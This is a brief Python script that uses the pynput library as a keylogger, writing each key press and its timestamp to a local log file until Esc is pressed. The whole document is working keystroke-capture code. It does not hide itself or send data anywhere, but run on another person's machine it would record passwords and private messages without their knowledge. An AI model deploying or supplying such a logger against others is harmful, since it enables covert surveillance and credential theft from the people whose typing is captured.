from pynput.keyboard import Key,Listener
import logging
logging.basicConfig(filename=("log3.txt"),level=logging.DEBUG, format='%(message)s :%(asctime)s')

def press(key):
  KEY="{0} is pressed at ".format(key)
  logging.info(str(KEY))

def release(key):
  if key==Key.esc:
    return False
with Listener(on_press=press,on_release=release)as Listener:
  Listener.join()